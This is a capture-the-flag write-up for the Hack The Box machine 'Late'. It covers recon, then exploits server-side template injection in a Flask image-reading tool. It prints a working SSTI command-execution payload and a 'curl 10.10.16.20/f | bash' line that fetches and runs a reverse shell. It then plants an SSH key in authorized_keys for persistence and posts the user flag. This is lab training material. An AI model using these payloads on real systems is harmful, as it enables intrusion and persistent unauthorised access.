# Late 
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/5f238aa8-4222-42c6-8b9f-a9a9ed488089)

## STEPS:
> PORT SCANNING

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- -sVC 10.10.11.156 --min-rate 1000
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-16 00:03 PDT
Nmap scan report for late.htb (10.10.11.156)
Host is up (0.072s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 025e290ea3af4e729da4fe0dcb5d8307 (RSA)
|   256 41e1fe03a5c797c4d51677f3410ce9fb (ECDSA)
|_  256 28394698171e461a1ea1ab3b9a577048 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.66 seconds
```

1. Based from the nmap results, the machine runs a web application service and opens ssh login.

> WEB APP

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9fb306c7-1739-4dc5-80cc-b8f9cbad4ac2)


2. Scrolling down, there's another link which redirects to another subdommain --> images.late.htb.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f2b77347-64f0-4ef0-8181-45eb4a5ddff1)


> images.late.htb

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/007a61cf-d04c-4d43-ab18-d7f339278b24)


> Running wfuzz to check another subdomain --> found only images.late.htb.

```
wfuzz -u "http://late.htb" -H "Host: FUZZ.late.htb" -w SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hh 9461
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/cf0e6f3e-68b4-4bc7-9c3b-ee01891249e8)


3. Interesting, since it said that it built with Flask, hence it could related to SSTI vuln.
4. Let's check that by uploading a file which has regex operation such --> {{ 7*7 }}.
5. I used [this](https://smallseotools.com/text-to-image/) online tool to convert text to image with ease.
6. After uploaded the image, automatically we got this:

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/517934d4-4034-4c13-b418-75f11326dab7)


```
┌──(brandy㉿bread-yolk)-[~/Downloads]
└─$ cat results.txt
<p>49
</p>
```

7. Great! This should be our foothold.
8. Let's try to run simple SSTI payload to check whether there is filter.

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/bf026a13-e379-4b42-925b-5d8a5d5c5198)


9. To fix this I tried to change the font to monospace, background color to black, font color to white, and zoom level max.

```
┌──(brandy㉿bread-yolk)-[~/Downloads]
└─$ cat results.txt
<p>uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)

</p>
```

10. Nice! Even the basic payload is executed, let's send our reverse shell payload.

> PAYLOAD

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/196cd6f7-d671-42df-b3fc-065922cfa3ee)

> What to send

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl 10.10.16.20/f | bash').read()}}
```

#### NOTES:

```
Change "bash" to "sh" won't work. 
```

11. So what to do now is, convert the SSTI payload to image file, then set a listener on port 1337, lastly set python server (because we want to curl a file from our local machine). Send the image.

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b1965299-eae7-4c51-a421-787e0890eb55)


> GETTING USER FLAG

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c3168416-af54-4364-bf99-f43101944c80)



## USER FLAG

```
abb776efaca5d2c498c0340369be1cb1
```

12. To do privesc, it's easier by running linpeas first to check for possible paths to escalate privileges.
13. Let's get a stable shell first so we can simply send linpeas to the target server.
14. Let's create ssh-keygen svc_acc.

```
┌──(brandy㉿bread-yolk)-[~/.ssh]
└─$ ssh-keygen -f svc_acc          
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in svc_acc
Your public key has been saved in svc_acc.pub
The key fingerprint is:
SHA256:6wpncMbmOmG3ppV+uKtXtkKxqjYa9V1U3wCv1Uppw9g brandy@bread-yolk
The key's randomart image is:
+---[RSA 3072]----+
|          o..    |
|         . * =   |
|        . . E o  |
|     ...   = o   |
|  . . =oS . .    |
| . .oB+oo.       |
|.  .o=B=..       |
| .o oB*.o        |
|.o.o+*=*.        |
+----[SHA256]-----+
```

15. Then copy our svc_acc.pub and append it to **authorized_keys** file at the remote server.

```
svc_acc@late:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDxjPVPhAZqY1pPHV0kIjUOY987zhsVNL8tIU24XOYZlZTCjyGaOAEcH7GrY9MYbqHlR//eGzlXgIRWe97iDmXyqvoGV7SPhHrYFO8dhLndxRnPw1fEsCcs+vgdDG+I0h8KD5KXVJ1Py/gIVzB/F26klWYrVOTb3monzO6dvREBf28usBf4UDLcekWrUgel47Te38v1AQICVXUEUdUTk1cJA8GXs4Y4XKQnh+GdpZNM0REaIHQveYwTzzNtJ1p3QVPtBXWXUkJ0miifXBDjPVVKGperNZ9ukJrXFIpV6HSwh+/dl6Iv7YXEOOkMoHrS04+2cpSYsmemB7OxOnIGKnJhK6IvIBL6NWIe9a7edFfVLf+FCPJWkMl89667XbD/W2uDfJ2VICQ+uiaVs2TtXralVAg+X8NFFzOWuQrEQ6AQaSU29twkKi7Yh3T4nmRUegO9YdQB6EmQ4rr8AEQVsB4Jk2Kw8XdCx3rPiJ/SSth8FqrzdGLXE+z8zJiO3lGS+N8= brandy@bread-yolk" >> authorized_keys
<8zJiO3lGS+N8= brandy@bread-yolk" >> authorized_keys
svc_acc@late:~/.ssh$
```

16. Finally, simply run --> `ssh -i svc_acc svc_acc@late.htb` and we got the stable shell.



